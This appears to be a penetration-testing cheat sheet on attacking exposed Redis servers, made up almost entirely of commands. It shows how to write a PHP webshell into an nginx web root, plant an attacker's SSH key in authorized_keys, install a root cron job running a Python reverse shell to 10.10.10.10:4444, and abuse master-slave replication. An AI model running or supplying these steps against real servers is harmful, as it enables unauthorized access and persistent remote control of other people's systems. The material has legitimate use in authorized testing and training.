# Redis

## Webshell

You must know the path of the Web site folder:

```
root@machine:~# redis-cli -h 10.10.10.10
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```

## SSH

1. Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa
2. Write the public key to a file : (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
3. Import the file into redis : cat foo.txt | redis-cli -h 10.85.0.52 -x set givshellplox
4. Save the public key to the authorized_keys file on redis server:

```
root@machine:~# redis-cli -h 10.10.10.10
10.85.0.52:6379> config set dir /home/user/.ssh/
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```


## Reverse shell Crontab

```
root@machine:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```

The last example is for Ubuntu, for Centos, the above command should be: redis-cli -h 10.85.0.52 config set dir /var/spool/cron/

## Master-Slave Module

Make our redis server master in the cluster. Make vuln server our slave.

```
redis-cli -h 10.10.10.10 -p 6379
slaveof 10.85.0.51 6379
```

```
redis-cli -h 10.10.10.11 -p 6379
set mykey hello
set mykey2 helloworld
```